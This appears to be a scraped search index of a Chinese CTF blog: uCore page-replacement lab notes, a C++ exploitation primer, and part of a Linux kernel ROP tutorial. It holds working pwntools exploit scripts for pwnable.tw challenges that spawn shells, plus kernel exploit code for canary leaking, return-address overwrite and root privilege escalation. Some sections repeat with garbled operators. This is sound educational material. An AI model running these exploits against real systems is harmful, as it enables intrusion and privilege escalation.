缺页时，计算从上次缺页时间$t_{last}$到现在$t_{current}$的时间间隔 如果$t_{current}−t_{last}T$，则置换所有在$[t_{last},t_{current}]$时间内没有被引用的页。 如果$t_{current}−t_{last}","date":"2021-12-01","objectID":"/ucore-lab-3/:2:2","series":null,"tags":["Pwn"],"title":"uCore-lab-3","uri":"/ucore-lab-3/#简介-2"},{"categories":["Pwning"],"content":"缺页率置换算法（PPF）简介通过调节常驻集大小，使每个进程的缺页率保持在一个合理的范围内。 若进程缺页率过高，则增加常驻集以分配更多的物理内存 若进程缺页率过低，则减小常驻集以减小它的物理页面数。 具体实现 访存时，设置引用位标志 缺页时，计算从上次缺页时间$t_{last}$到现在$t_{current}$的时间间隔 如果$t_{current}−t_{last}T$，则置换所有在$[t_{last},t_{current}]$时间内没有被引用的页。 如果$t_{current}−t_{last}","date":"2021-12-01","objectID":"/ucore-lab-3/:2:2","series":null,"tags":["Pwn"],"title":"uCore-lab-3","uri":"/ucore-lab-3/#具体实现-2"},{"categories":["Pwning"],"content":"抖动问题（thrashing）如果分配给一个进程的物理页面太少，不能包含整个的工作集，即常驻集属于工作集，那么进程将会造成很多的页面中断，需要频繁的在内存和外存之间替换页面，从而使进程的运行速度变得很慢，这种状态称为抖动。 产生抖动的原因：随着驻留内存的进程数目增加，分配给每个进程的物理页面数不断减小，缺页率不断上升。所以操作系统要选择一个适当的进程数目和进程所需要的帧数，以便在并发水平和缺页率之间达到一个平衡。 ","date":"2021-12-01","objectID":"/ucore-lab-3/:2:3","series":null,"tags":["Pwn"],"title":"uCore-lab-3","uri":"/ucore-lab-3/#抖动问题thrashing"},{"categories":["Pwning"],"content":"练习1给未被映射的地址映射上物理页 注意发生page falut的两种情况： 物理页未被映射，页表项为空 页表项不为空，对应的物理页面被换出到swap /*LAB3 EXERCISE 1: YOUR CODE*/ //(1) try to find a pte, if pte's PT(Page Table) isn't existed, then create a PT. if((ptep = get_pte(mm-\u003epgdir, addr, 1)) == NULL) { cprintf(\"get_pte in do_pgfalut failed\\n\"); goto failed; } if (*ptep == 0) { //(2) if the phy addr isn't exist, then alloc a page \u0026 map the phy addr with logical addr if(pgdir_alloc_page(mm-\u003epgdir, addr, perm) == NULL) { cprintf(\"pgdir_alloc_page in do_pgfalut failed\\n\"); goto failed; } } else { /*LAB3 EXERCISE 2: YOUR CODE * Now we think this pte is a swap entry, we should load data from disk to a page with phy addr, * and map the phy addr with logical addr, trigger swap manager to record the access situation of this page. * * Some Useful MACROs and DEFINEs, you can use them in below implementation. * MACROs or Functions: * swap_in(mm, addr, \u0026page) : alloc a memory page, then according to the swap entry in PTE for addr, * find the addr of disk page, read the content of disk page into this memroy page * page_insert ： build the map of phy addr of an Page with the linear addr la * swap_map_swappable ： set the page swappable */ if(swap_init_ok) { struct Page *page = NULL; //(1）According to the mm AND addr, try to load the content of right disk page // into the memory which page managed. if((ret = swap_in(mm, addr, \u0026page)) != 0) { cprintf(\"swap_in in do_pgfalut failed\\n\"); goto failed; } //(2) According to the mm, addr AND page, setup the map of phy addr \u003c---\u003e logical addr page_insert(mm-\u003epgdir, page, addr, perm); //(3) make the page swappable. swap_map_swappable(mm, addr, page, 1); page-\u003epra_vaddr = addr; } else { cprintf(\"no swap_init_ok but ptep is %x, failed\\n\", *ptep); goto failed; } } ","date":"2021-12-01","objectID":"/ucore-lab-3/:0:0","series":null,"tags":["Pwn"],"title":"uCore-lab-3","uri":"/ucore-lab-3/#练习1"},{"categories":["Pwning"],"content":"练习2补充完成基于FIFO的页面替换算法 FIFO的PRA维护了一个链表，链表中的页按照从旧（驻留时间最长）到新（最近驻留）的顺序排列。 所以在换入一个页面时，需要将其加入到链表的尾部。换出时，只要将链表头指向的页换出。 static int _fifo_map_swappable(struct mm_struct *mm, uintptr_t addr, struct Page *page, int swap_in) { list_entry_t *head=(list_entry_t*) mm-\u003esm_priv; list_entry_t *entry=\u0026(page-\u003epra_page_link); assert(entry != NULL \u0026\u0026 head != NULL); //record the page access situlation /*LAB3 EXERCISE 2: YOUR CODE*/ //(1)link the most recent arrival page at the back of the pra_list_head qeueue. list_add(head-\u003eprev, entry); return 0; } static int _fifo_swap_out_victim(struct mm_struct *mm, struct Page ** ptr_page, int in_tick) { list_entry_t *head=(list_entry_t*) mm-\u003esm_priv; assert(head != NULL); assert(in_tick==0); /* Select the victim */ /*LAB3 EXERCISE 2: YOUR CODE*/ //(1) unlink the earliest arrival page in front of pra_list_head qeueue //(2) assign the value of *ptr_page to the addr of this page list_entry_t *le = head-\u003enext; struct Page *p = le2page(le, pra_page_link); list_del(le); *ptr_page = p; return 0; } ","date":"2021-12-01","objectID":"/ucore-lab-3/:0:0","series":null,"tags":["Pwn"],"title":"uCore-lab-3","uri":"/ucore-lab-3/#练习2"},{"categories":["Pwning"],"content":"C++ Exploitation BasicLearn from angelboy’s slide \u0026 reference link \u0026 reference link [TOC] ","date":"2021-08-28","objectID":"/cpp-exploitation-basic/:0:0","series":null,"tags":["Pwn"],"title":"C++ Exploitation Basic","uri":"/cpp-exploitation-basic/#c-exploitation-basic"},{"categories":["Pwning"],"content":"Name manglingC++支持函数重载，在C中如果两个函数重名，这将会是非常严重的编译器级错误。问题的关键在于出现了两个相同的symbol让编译器无法识别。为了实现函数重载，编译器需要向链接器传递关于函数的更多信息，例如：参数类型、调用约定和返回值类型。 一个函数在不同的命名空间下会有不同的名称。这就也是在IDA中C++的函数名会那么奇怪。 关于Name Mangling，wiki中有非常棒的解释。 在gdb中使用set print asm-demangle on可以显示修饰后的函数名。 ","date":"2021-08-28","objectID":"/cpp-exploitation-basic/:1:0","series":null,"tags":["Pwn"],"title":"C++ Exploitation Basic","uri":"/cpp-exploitation-basic/#name-mangling"},{"categories":["Pwning"],"content":"Virtual function table对于每个有虚拟函数的类，根据类的继承层次，编译器将创建一个或多个相关的虚函数表。对于每个实例化的类变量，都会在堆上为其申请内存。其中包含指向类虚函数表的指针。 struct A { void *vtable; type var_1; type var_; ... } vatble在程序段的只读区域，但是类中的虚表指针却是在堆上的。我们可以overwrite它控制程序的执行。 在Linux C++中内存分配的底层还是malloc和free，所以chunk的数据结构没有变化。虚表指针就是放在返回用户chunk的开头，紧接着是其他变量数据。 ","date":"2021-08-28","objectID":"/cpp-exploitation-basic/:2:0","series":null,"tags":["Pwn"],"title":"C++ Exploitation Basic","uri":"/cpp-exploitation-basic/#virtual-function-table"},{"categories":["Pwning"],"content":"Vector \u0026 String","date":"2021-08-28","objectID":"/cpp-exploitation-basic/:3:0","series":null,"tags":["Pwn"],"title":"C++ Exploitation Basic","uri":"/cpp-exploitation-basic/#vector--string"},{"categories":["Pwning"],"content":"Vectorvector在c++中是动态数组，分配在heap中。当内存不够大时，会再申请新的内存，并将原来的内存free掉。 有三个重要成员： _M_start：vector的起始位置 _M_finish：vector的结尾位置 _M_end_of_storage：vector内存空间末尾 放入新元素时判断，如果_M_finish == _M_end_of_storage则会申请新的内存。 ","date":"2021-08-28","objectID":"/cpp-exploitation-basic/:3:1","series":null,"tags":["Pwn"],"title":"C++ Exploitation Basic","uri":"/cpp-exploitation-basic/#vector"},{"categories":["Pwning"],"content":"Stringstring在c++中是动态内存数组，也是分配在heap中的。 其成员有： size：字符串的长度 capacity：该string空间的容量 reference count：引用计数 只要有其他元素引用该字符串就会增加，如果不再引用会减少，当其为零，内存空间会被delete掉 value：字符串内容 g++ \u003c 5在对string变量进行输入时，有一种非常有趣的机制。程序会不断的向string空间写入数据，size则逐渐增加。写入新数据时会判断，若size == capacity，则会新申请2*capacity的内存，并将原本的内存free。同时，被free的空间的refcnt会被置为-1。 在初始时，refcnt为0。此时只有变量本身指向内存空间。如果将字符串push_back到vector中，则vector的空间也会有执行这块内存的指针，refcnt++。如果字符串被pop出来，refcnt--。在变量作用域结束时，会调用string变量析构函数，refcnt--，此时refcnt \u003c 0，会将其free。 g++ \u003e 5g++\u003e5之后取消了COW(Copy-on-Write)机制，没有了refcnt域。而是： data length \u003c= 15 时使用local buffer data length \u003e 15 时则在heap申请空间 Copy-on-Write: 在复制一个变量时，不一定会对其进行更改。所以，我们不需要马上将内存空间复制，在其将要被改变的时候才复制完整的内存。 但是空间递增依然没有变化，所以当string的length \u003e 15 后会对堆风水产生影响。 现在成员如下： data pointer：执行data空间 size：分配出去的string的长度 union local buffer： size \u003c=15 时存放data allocated capacity：size \u003e 15 时用来记录capacity ","date":"2021-08-28","objectID":"/cpp-exploitation-basic/:3:2","series":null,"tags":["Pwn"],"title":"C++ Exploitation Basic","uri":"/cpp-exploitation-basic/#string"},{"categories":["Pwning"],"content":"Stringstring在c++中是动态内存数组，也是分配在heap中的。 其成员有： size：字符串的长度 capacity：该string空间的容量 reference count：引用计数 只要有其他元素引用该字符串就会增加，如果不再引用会减少，当其为零，内存空间会被delete掉 value：字符串内容 g++ 5g++5之后取消了COW(Copy-on-Write)机制，没有了refcnt域。而是： data length 15 时则在heap申请空间 Copy-on-Write: 在复制一个变量时，不一定会对其进行更改。所以，我们不需要马上将内存空间复制，在其将要被改变的时候才复制完整的内存。 但是空间递增依然没有变化，所以当string的length 15 后会对堆风水产生影响。 现在成员如下： data pointer：执行data空间 size：分配出去的string的长度 union local buffer： size 15 时用来记录capacity ","date":"2021-08-28","objectID":"/cpp-exploitation-basic/:3:2","series":null,"tags":["Pwn"],"title":"C++ Exploitation Basic","uri":"/cpp-exploitation-basic/#g--5"},{"categories":["Pwning"],"content":"Stringstring在c++中是动态内存数组，也是分配在heap中的。 其成员有： size：字符串的长度 capacity：该string空间的容量 reference count：引用计数 只要有其他元素引用该字符串就会增加，如果不再引用会减少，当其为零，内存空间会被delete掉 value：字符串内容 g++ 5g++5之后取消了COW(Copy-on-Write)机制，没有了refcnt域。而是： data length 15 时则在heap申请空间 Copy-on-Write: 在复制一个变量时，不一定会对其进行更改。所以，我们不需要马上将内存空间复制，在其将要被改变的时候才复制完整的内存。 但是空间递增依然没有变化，所以当string的length 15 后会对堆风水产生影响。 现在成员如下： data pointer：执行data空间 size：分配出去的string的长度 union local buffer： size 15 时用来记录capacity ","date":"2021-08-28","objectID":"/cpp-exploitation-basic/:3:2","series":null,"tags":["Pwn"],"title":"C++ Exploitation Basic","uri":"/cpp-exploitation-basic/#g--5-1"},{"categories":["Pwning"],"content":"New \u0026 delete虽然new和delete的底层依然是malloc和free，但是依然有很大的差别。 new： 内存分配失败，不会返回NULL，而是会抛出异常 调用构造函数初始化变量 delete： 调用析构函数销毁变量 释放空间 new和malloc返回的是不同的东西，new返回一个初始化的对象，malloc返回原始内存指针。所以，delete和free做了不同的操作，它们不能混用！ new调用了operator new，delete调用了operator delete，而c++支持运算符重载。所以，我们可以自定义它们。 ","date":"2021-08-28","objectID":"/cpp-exploitation-basic/:4:0","series":null,"tags":["Pwn"],"title":"C++ Exploitation Basic","uri":"/cpp-exploitation-basic/#new--delete"},{"categories":["Pwning"],"content":"Copy constructor \u0026 assignment operator #include \u003ciostream\u003e#include \u003cstring\u003e#include \u003cvector\u003e#include \u003cstring.h\u003eusing namespace std; class Stu { public: Stu():name(NULL), id(0){} Stu(string str, int stuid) { name = new char[str.length()+1]; strcpy(name, str.c_str()); id = stuid; } void putinfo() { cout \u003c\u003c id \u003c\u003c \":\" \u003c\u003c name \u003c\u003c endl; } ~Stu() { delete[] name; } private: int id; char *name; }; int main() { vector\u003cStu\u003e stulist; Stu student = Stu(\"John\", 233); stulist.push_back(student); stulist[0].putinfo(); return 0; } test@test:~/ctf$ ./test 233:John free(): double free detected in tcache 2 Aborted (core dumped) 问题在哪里呢？ 定义两种copy方式 shallow copy：只做指针的复制，指向的内存空间不会发生变化 deep copy：申请新的空间，复制指针指向的内容，新的指针指向新的空间 c++中可以为类定义copy constructor，在复制对象时会进行调用。如果没有自定义则会使用default copy constructor，只进行shallow copy。 另一种操作是赋值运算符，这也是可以自定义的。如果没有，只进行shallow copy。 copy constructor使用： func(class_name var)，以类为函数参数 retturn class_var vector等STL容器 … 赋值运算符使用： stu1 = stu2 vector等STL容器 … 回到前面的代码，stulist.push_back(student)做了shallow copy，vector和student空间中都有了指向name的指针。return 0时，类变量生命周期结束，调用destructor释放了name所在空间。vector生命周期结束，为其中的每一个元素调用对应的destructor，造成double free。 ","date":"2021-08-28","objectID":"/cpp-exploitation-basic/:5:0","series":null,"tags":["Pwn"],"title":"C++ Exploitation Basic","uri":"/cpp-exploitation-basic/#copy-constructor--assignment-operator"},{"categories":["Pwning"],"content":"异常处理简单来说c++的异常处理有三个部分组成 try 包含可能抛出异常的代码 throw 抛出异常 catch 捕获异常并做处理 首先澄清一点，这里说的 “C++ 函数”是指： 该函数可能会直接或间接地抛出一个异常：即该函数的定义存放在一个 C++ 编译（而不是传统 C）单元内，并且该函数没有使用“throw()”异常过滤器。 或者该函数的定义内使用了 try 块。 ","date":"2021-08-28","objectID":"/cpp-exploitation-basic/:6:0","series":null,"tags":["Pwn"],"title":"C++ Exploitation Basic","uri":"/cpp-exploitation-basic/#异常处理"},{"categories":["Pwning"],"content":"Stack unwind当异常抛出后，就会去寻找catch。如果在本函数中没有找到，则会沿着函数调用链向上寻找，最后有两种结果： 找到了catch，记录catch位置，从抛出异常的函数开始清理栈，直到到达catch所在函数，进入catch的代码进行处理 走完调用链都没有找到相应的 catch，那么调用std::terminate()，这个函数默认把程序 abort 程序中的 catch 那部分代码有一个专门的名字叫作：Landing pad（不十分准确），从抛出异常开始到执行 landing pad 里的代码这中间的整个过程叫作 stack unwind 源码如下： extern \"C\" void __cxxabiv1::__cxa_throw (void *obj, std::type_info *tinfo, void (_GLIBCXX_CDTOR_CALLABI *dest) (void *)) { PROBE2 (throw, obj, tinfo); // Definitely a primary. __cxa_refcounted_exception *header = __get_refcounted_exception_header_from_obj (obj); header-\u003ereferenceCount = 1; header-\u003eexc.exceptionType = tinfo; header-\u003eexc.exceptionDestructor = dest; header-\u003eexc.unexpectedHandler = std::get_unexpected (); header-\u003eexc.terminateHandler = std::get_terminate (); __GXX_INIT_PRIMARY_EXCEPTION_CLASS(header-\u003eexc.unwindHeader.exception_class); header-\u003eexc.unwindHeader.exception_cleanup = __gxx_exception_cleanup; #ifdef _GLIBCXX_SJLJ_EXCEPTIONS _Unwind_SjLj_RaiseException (\u0026header-\u003eexc.unwindHeader); #else _Unwind_RaiseException (\u0026header-\u003eexc.unwindHeader); #endif // Some sort of unwinding error. Note that terminate is a handler. __cxa_begin_catch (\u0026header-\u003eexc.unwindHeader); std::terminate (); } 概括一下就是： 调用 __cxa_allocate_exception 函数，分配一个异常对象。 调用 __cxa_throw 函数，这个函数会将异常对象做一些初始化。 __cxa_throw() 调用 Itanium ABI 里的 _Unwind_RaiseException() 从而开始 unwind。 _Unwind_RaiseException() 对调用链上的函数进行 unwind 时，调用 personality routine。 如果该异常如能被处理(有相应的 catch)，则 personality routine 会依次对调用链上的函数进行清理。 _Unwind_RaiseException() 将控制权转到相应的catch代码。 unwind 完成，用户代码继续执行 Itanium ABI 定义了一系列函数及相应的数据结构来建立整个异常处理的流程及框架 personality routine 则主要负责做两件事情： 检查当前函数是否含有相应 catch 可以处理上面抛出的异常。 清掉调用栈上的局部变量。 这里就有一个问题，程序如何确定函数中是否有catch呢？ 根据我查阅的资料，编译器会向每个函数的栈中放入一个结构体，栈上这些结构体连成一个链表。其中包含了栈回退所要的一些信息。有一个nstep字段，它标识现在回退的阶段。try block的开始与结尾会有一个ID标识，如果nstep在这个范围，则说明函数中有catch块。 然而，在调试时我发现现在并没有这个结构，但是依然可以正确捕获。栈回退不再以nstep作为标志，而是直接通过返回地址，如果返回地址在所记录的try block范围，则判定有catch block。这简化了我们的利用。只要保证返回地址的范围即可确保被捕获。 其中更具体的细节不再讨论。 在题目中，通过异常处理可以帮助绕过一些检查，为利用做铺垫。 ","date":"2021-08-28","objectID":"/cpp-exploitation-basic/:6:1","series":null,"tags":["Pwn"],"title":"C++ Exploitation Basic","uri":"/cpp-exploitation-basic/#stack-unwind"},{"categories":["Pwning"],"content":"Practise：zoochallenge link 题目是一个简单的菜单题。在name赋值时使用的strcpy没有检查大小造成溢出，可以覆盖虚表指针。 from pwn import * leak = lambda name,addr: log.success('{0}addr ---\u003e {1}'.format(name, hex(addr))) binary = './zoo' libc = '/lib/x86_64-linux-gnu/libc.so.6' context.terminal = ['tmux', 'splitw', '-h'] context(binary = binary, log_level='debug') p = process(binary) # p = remote('chall.pwnable.tw',10202) elf = ELF(binary) libc = ELF(libc) def cmd(i): p.sendlineafter('choice :',str(i)) def adddog(n,w): cmd(1) p.sendlineafter('Name : ',n) p.sendlineafter('Weight : ',w) def addcat(n,w): cmd(2) p.sendlineafter('Name : ',n) p.sendlineafter('Weight : ',w) def listen(n): cmd(3) p.sendlineafter('animal :',str(n)) def info(n): cmd(4) p.sendlineafter('animal :',str(n)) def dele(n): cmd(5) p.recvuntil('index of animal : ') p.sendline(str(n)) sc = asm(shellcraft.sh()) # 0x605420 p.sendline('a'*8+p64(0x605420+0x10)+sc) adddog('1'*0x8,'1') adddog('a'*0x8,'2') dele(0) # gdb.attach(p) adddog('n'*0x48+p64(0x605420+0x8),'2') listen(0) p.interactive() ","date":"2021-08-28","objectID":"/cpp-exploitation-basic/:7:0","series":null,"tags":["Pwn"],"title":"C++ Exploitation Basic","uri":"/cpp-exploitation-basic/#practisezoo"},{"categories":["Pwning"],"content":"Practise：flexchallenge link 在第一个选项中，可以在charset length处输入一个负数，从而进行栈溢出。再触发异常，catch代码在上层函数中。catch处理过后，又回到了上层函数的返回处。 可以通过栈迁移，在msg中写入ROP链。再通过想msg写数据，让函数返回到og from pwn import * leak = lambda name,addr: log.success('{0}addr ---\u003e {1}'.format(name, hex(addr))) binary = './flex' libc = '/lib/x86_64-linux-gnu/libc.so.6' context.terminal = ['tmux', 'splitw', '-h'] context(binary = binary, log_level='debug') p = process(binary) # p = remote('chall.pwnable.tw',10202) elf = ELF(binary) libc = ELF(libc) msg = 0x6061C0 pop_rdi = 0x00000000004044d3 readn = 0x4012D9 leave_ret = 0x0000000000400f1c p.sendlineafter('option:','1') p.sendlineafter('(yes/No)','No') p.sendlineafter('(yes/No)','yes') p.sendlineafter('length:','-2') # payload = 'a' payload = p64(msg)*37+p64(0x40150d) p.sendline(payload) gdb.attach(p) payload = p64(0)+p64(pop_rdi)+p64(elf.got['puts'])+p64(elf.plt['puts'])+p64(readn) p.sendlineafter('pattern:',payload) sleep(0.5) libcbase = u64(p.recvuntil('\\x7f')[-6:].ljust(8,'\\x00')) - libc.sym['puts'] og = libcbase + 0x10a41c p.sendline(p64(og)*0x6+p64(0x0)*10) p.interactive() ''' 0x4f3d5 execve(\"/bin/sh\", rsp+0x40, environ) constraints: rsp \u0026 0xf == 0 rcx == NULL 0x4f432 execve(\"/bin/sh\", rsp+0x40, environ) constraints: [rsp+0x40] == NULL 0x10a41c execve(\"/bin/sh\", rsp+0x70, environ) constraints: [rsp+0x70] == NULL ''' ","date":"2021-08-28","objectID":"/cpp-exploitation-basic/:8:0","series":null,"tags":["Pwn"],"title":"C++ Exploitation Basic","uri":"/cpp-exploitation-basic/#practiseflex"},{"categories":["Pwning"],"content":"Kernel ROP学习Linux kernel Pwn的第一次尝试，hxp2020: kernel-rop Thanks @Midas for so great tutorials ! ","date":"2021-08-22","objectID":"/linuxkernel-pwn-learning/:0:0","series":null,"tags":["Pwn","Kernel"],"title":"Linux Kernel-Pwn Learning","uri":"/linuxkernel-pwn-learning/#kernel-rop"},{"categories":["Pwning"],"content":"环境设置将附件解压得到以下文件： initramfs.cpio.gz：压缩的文件系统，诸如/bin、/etc… 都被放入这里。其中也可能包含有漏洞的模块 vmlinuz：压缩的Linux kernel镜像，我们可以从中提取出kernel ELF文件。 run.sh：运行kernel的shell脚本，我们可以在这里更改内核的启动选项。为了正常运行我们需要提前安装qemu。 其他文件Dockerfile、yneted等都是帮助我们搭建本地服务环境的。 ","date":"2021-08-22","objectID":"/linuxkernel-pwn-learning/:1:0","series":null,"tags":["Pwn","Kernel"],"title":"Linux Kernel-Pwn Learning","uri":"/linuxkernel-pwn-learning/#环境设置"},{"categories":["Pwning"],"content":"Kernel ./extract-image.sh ./vmlinuz \u003e vmlinux 提取内核ELF文件到vmlinux。 下一步，我们要提取kernel中的gadget，但是由于kernel很大，使用ROPgadget需要几分钟的时间。所以，我们提前将所有gadget放入文件中。 ROPgadget --binary ./vmlinux \u003e gadgets.txt 这可能需要很久。可以用ropper，听说会更快。 ","date":"2021-08-22","objectID":"/linuxkernel-pwn-learning/:1:1","series":null,"tags":["Pwn","Kernel"],"title":"Linux Kernel-Pwn Learning","uri":"/linuxkernel-pwn-learning/#kernel"},{"categories":["Pwning"],"content":"文件系统使用脚本将其解压 mkdir initramfs cd initramfs cp ../initramfs.cpio.gz . gunzip ./initramfs.cpio.gz cpio -idm \u003c ./initramfs.cpio rm initramfs.cpio 解压后的文件系统在initramfs文件夹中，其中有一个hackme.ko的驱动。很明显我们要利用它。 解压文件系统的另一个目的是更改其中的一些设置，便于我们在后面对一些文件的访问。在/etc的文件中，找到这样的命令并修改它，本题中为inittab文件 setuidgid 1000 /bin/sh # Modify it into the following setuidgid 0 /bin/sh 在完成利用后，我们要把它切换回1000 在修改完成后我们要将其压缩回去，使用compress.sh： gcc -o exploit -static $1 mv ./exploit ./initramfs cd initramfs find . -print0 \\ | cpio --null -ov --format=newc \\ | gzip -9 \u003e initramfs.cpio.gz mv ./initramfs.cpio.gz ../ 前两行是编译我们的exp，把它加入到文件系统中。 在很多教程中，都使用了busybox模拟文件系统。如果题目提供了文件系统，也可以使用这种直接解压的方式。两种方式所要达到的目的是一样的，按个人习惯选择即可。脚本经过修改都是通用的。 ","date":"2021-08-22","objectID":"/linuxkernel-pwn-learning/:1:2","series":null,"tags":["Pwn","Kernel"],"title":"Linux Kernel-Pwn Learning","uri":"/linuxkernel-pwn-learning/#文件系统"},{"categories":["Pwning"],"content":"run.sh #!/bin/sh qemu-system-x86_64 \\ -m 128M \\ -cpu kvm64,+smep,+smap \\ -kernel vmlinuz \\ -initrd initramfs.cpio.gz \\ -hdb flag.txt \\ -snapshot \\ -nographic \\ -monitor /dev/null \\ -no-reboot \\ -append \"console=ttyS0 kaslr kpti=1 quiet panic=1\" -m：指定内存大小，如果不能启动可以尝试增加内存 -cpu：指定cpu的模式，+smep和+smap是一些保护机制 -kernel：指定内核镜像文件 -initrd：指定文件系统文件 -append：指定其他一些启动选项，包括一些保护机制 加入-s选项，我们可以在本地的1234端口进行调试。 $ gdb vmlinux (gdb) target remote localhost:1234 ","date":"2021-08-22","objectID":"/linuxkernel-pwn-learning/:1:3","series":null,"tags":["Pwn","Kernel"],"title":"Linux Kernel-Pwn Learning","uri":"/linuxkernel-pwn-learning/#runsh"},{"categories":["Pwning"],"content":"How to debug kernel调试内核，首先需要一个断点。使用lsmod可以列出所有加载的模块，及其基址（root权限）。如果没有想要的模块可以使用insmod加载指定的模块。用rmmod卸载指定模块。 经过IDA静态分析使用base + offset的方式断在我们想要的地方。但是内核对象很特殊，或者说目前的工具对内核的调试支持并不是十分完美。当然，windbg对内核调试的支持很好。所以，你下的断点是很有可能有断不下来的情况。另外，内核在单步调试时极有可能出现跑飞的现象，停在一个你不知道的地方。使用si可以一定程度上避免这样。而这就要求我们必须将断点下的更加有针对性。 gdb还有可能将函数名进行错误识别，都是正常情况。 ","date":"2021-08-22","objectID":"/linuxkernel-pwn-learning/:1:4","series":null,"tags":["Pwn","Kernel"],"title":"Linux Kernel-Pwn Learning","uri":"/linuxkernel-pwn-learning/#how-to-debug-kernel"},{"categories":["Pwning"],"content":"Linux kernel 缓解机制 Kernel stack cookies（canary）：内核栈的canary保护。 Kernel address space layout randomization（KASLR）：内核地址随机化；与用户态的ASLR一样，将内核地址随机加载。 Function Granular KASLR： 与用户态不同的是，内核态的函数相对于基址的偏移在加载时也被随机化了。在开启FGKASLR后，内核有一小部分的数据偏移是确定的。 个人理解：要想对所有的数据进行如此强度的随机化是不可能的，内核也是程序，在程序运行过程中，总有一些关于加载的数据需要访问，这部分数据必须要让内核准确的知道其所在的地址。那么，这部分数据就是不能随机化的。 Supervisor mode execution protection（SMEP）：当进程属于内核态时，所有的用户空间的页在页表中都被标记为不可执行。在kernel中，通过将CR4寄存器的20th bit置位来使能。在启动时，通过在-cpu上+smep来启用，在-append的中加入nosmep来禁用。 Supervisor Mode Access Prevention （SMAP）：SMEP的补充。在内核态时，用户空间的任何页面都是不可访问的。在kernel中，通过将CR4寄存器的2th bit置位来使能。在启动时，通过在-cpu上+smap来启用，在-append的中加入nosmap来禁用。 Kernel page-table isolation（KPTI）：当这个机制使能时，内核将用户空间和内核空间的页表完全分开。此时，内核态的页表拥有内核空间和用户空间的页，用户态的页表包含了用户空间和最小的内核空间。它可以通过在-append选项下添加kpti=1或nopti来启用/禁用。 ","date":"2021-08-22","objectID":"/linuxkernel-pwn-learning/:2:0","series":null,"tags":["Pwn","Kernel"],"title":"Linux Kernel-Pwn Learning","uri":"/linuxkernel-pwn-learning/#linux-kernel-缓解机制"},{"categories":["Pwning"],"content":"Kernel module: hackme.ko内核模块（驱动）也是ELF文件，我们在IDA中进行分析。 init_module注册了一个名为hackme的设备，包含以下操作：hackme_read，hackme_write，hackme_open 和 hackme_release。我们可以通过open(\"/dev/hackme\")来与之交互，调用它注册的操作。 unsigned __int64 __fastcall hackme_read(__int64 a1, __int64 user_buf) { unsigned __int64 v2; // rdx unsigned __int64 size; // rbx bool v4; // zf unsigned __int64 result; // rax _QWORD buf[20]; // [rsp-A0h] [rbp-A0h] BYREF _fentry__(a1, user_buf); size = v2; // from 3rd arg buf[16] = __readgsqword(0x28u); _memcpy(\u0026hackme_buf, buf, v2); if ( size \u003e 0x1000 ) { _warn_printk(\"Buffer overflow detected (%d \u003c %lu)!\\n\", 4096LL); BUG(); } _check_object_size(\u0026hackme_buf, size, 1LL); v4 = copy_to_user(user_buf, \u0026hackme_buf, size) == 0; result = -14LL; if ( v4 ) result = size; return result; } unsigned __int64 __fastcall h_write(__int64 a1, __int64 user_buf, unsigned __int64 size) { char buf[128]; // [rsp+0h] [rbp-98h] BYREF unsigned __int64 v6; // [rsp+80h] [rbp-18h] v6 = __readgsqword(0x28u); if ( size \u003e 0x1000 ) { _warn_printk(\"Buffer overflow detected (%d \u003c %lu)!\\n\", 4096LL); BUG(); } _check_object_size(\u0026hackme_buf, size, 0LL); if ( copy_from_user(\u0026hackme_buf, user_buf, size) ) return -14LL; _memcpy(buf, \u0026hackme_buf, size); return size; } 漏洞很明显，我们可以从内核栈上读写最多0x1000的数据，这造成了溢出。 ","date":"2021-08-22","objectID":"/linuxkernel-pwn-learning/:3:0","series":null,"tags":["Pwn","Kernel"],"title":"Linux Kernel-Pwn Learning","uri":"/linuxkernel-pwn-learning/#kernel-module-hackmeko"},{"categories":["Pwning"],"content":"First step：ret2usr我们从最简单的开始学习，在用户态，当ASLR和NX都关闭时，我们可以想到常用的利用方式ret2shellcode。同样，当关闭几乎所有的保护后我们也可以返回到自己写的代码中。这个过程在内核态执行用户空间的代码，所以被称为ret2usr。 在开始之前，修改run.sh除去+smep、+smap、kpti=1、kaslr并添加nopti和nokaslr。 ","date":"2021-08-22","objectID":"/linuxkernel-pwn-learning/:4:0","series":null,"tags":["Pwn","Kernel"],"title":"Linux Kernel-Pwn Learning","uri":"/linuxkernel-pwn-learning/#first-stepret2usr"},{"categories":["Pwning"],"content":"Open the device在交互之前我们需要打开设备。 int global_fd; // 为了让其他函数能与设备交互 void open_dev() { global_fd = open(\"/dev/hackme\", O_RDWR); if (global_fd \u003c 0) { puts(\"[!] Failed to open device\"); exit(-1); } else { puts(\"[*] Opened device\"); } } ","date":"2021-08-22","objectID":"/linuxkernel-pwn-learning/:4:1","series":null,"tags":["Pwn","Kernel"],"title":"Linux Kernel-Pwn Learning","uri":"/linuxkernel-pwn-learning/#open-the-device"},{"categories":["Pwning"],"content":"Leak canary因为还有栈保护，所以还要先leak canary信息。 unsigned long canary; void leak(void){ unsigned n = 20; unsigned long leak[n]; ssize_t r = read(global_fd, leak, sizeof(leak)); canary = leak[16]; printf(\"[*] Leaked %zd bytes\\n\", r); printf(\"[*] Cookie: %lx\\n\", canary); } ","date":"2021-08-22","objectID":"/linuxkernel-pwn-learning/:4:2","series":null,"tags":["Pwn","Kernel"],"title":"Linux Kernel-Pwn Learning","uri":"/linuxkernel-pwn-learning/#leak-canary"},{"categories":["Pwning"],"content":"Overwrite return addr下面我们就要覆盖返回地址了 void overflow(void){ unsigned n = 50; unsigned long payload[n]; unsigned off = 16; payload[off++] = canary; payload[off++] = 0x0; // rbx payload[off++] = 0x0; // r12 payload[off++] = 0x0; // rbp payload[off++] = (unsigned long)pwned_addr; // ret puts(\"[*] Prepared payload\"); ssize_t w = write(global_fd, payload, sizeof(payload)); puts(\"[!] Should never be reached\"); } ","date":"2021-08-22","objectID":"/linuxkernel-pwn-learning/:4:3","series":null,"tags":["Pwn","Kernel"],"title":"Linux Kernel-Pwn Learning","uri":"/linuxkernel-pwn-learning/#overwrite-return-addr"},{"categories":["Pwning"],"content":"User shellcode在用户态下我们的目的往往是执行system(\"/bin/sh\")等，用来获取一个shell。在内核中，我们已经get shell了，但是权限却只是普通用户。我们需要得到一个root shell，来完全控制这个系统。 Linux系统下，每个进程拥有其对应的struct cred，用于记录该进程的uid。内核exploit的目的，便是修改当前进程的cred，从而提升权限。当然，进程本身是无法篡改自己的cred的，我们需要在内核空间中，通过以下方式来达到这一目的： commit_creds(prepare_kernel_cred(0)); 其中，prepare_kernel_cred()创建一个新的cred，参数为0则将cred中的uid, gid设置为0，对应于root用户。随后，commit_creds()将这个cred应用于当前进程。此时，进程便提升到了root权限。 